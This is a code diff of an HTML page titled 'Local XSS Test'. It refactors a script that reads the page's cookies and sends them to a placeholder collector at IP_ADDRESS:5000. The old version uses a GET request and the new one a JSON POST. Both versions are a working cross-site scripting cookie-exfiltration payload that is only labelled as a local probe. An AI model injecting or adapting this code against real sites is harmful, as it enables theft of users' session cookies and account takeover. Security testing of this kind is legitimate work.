@@ -1,11 +1,37 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    This sends the probe to http://IP_ADDRESS:5000.
-    <script>
-      document.cookie = "info=This is a test cookie"; 
-      var xhr = new XMLHttpRequest();
-      xhr.open('GET', "http://IP_ADDRESS:5000/store/{'cookies': '" + document.cookie + "', 'desc': 'local XSS test'}");
-      xhr.send()
-    </script>
-  </body>
+<head>
+  <title>Local XSS Test</title>
+</head>
+<body>
+  <p>This sends a probe to a specified URL for local XSS testing.</p>
+  
+  <script>
+    // Create a test cookie
+    document.cookie = "info=This is a test cookie";
+    
+    // Define the URL and payload data
+    var url = "http://IP_ADDRESS:5000/store";
+    var payload = { cookies: document.cookie, desc: "local XSS test" };
+    
+    // Create a new XMLHttpRequest
+    var xhr = new XMLHttpRequest();
+    
+    // Configure the request
+    xhr.open("POST", url, true);
+    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    
+    // Handle the response
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+        console.log("Request successful:", xhr.responseText);
+      } else if (xhr.readyState === 4) {
+        console.error("Request failed:", xhr.status, xhr.statusText);
+      }
+    };
+    
+    // Send the request with the payload as JSON
+    xhr.send(JSON.stringify(payload));
+  </script>
+</body>
 </html>
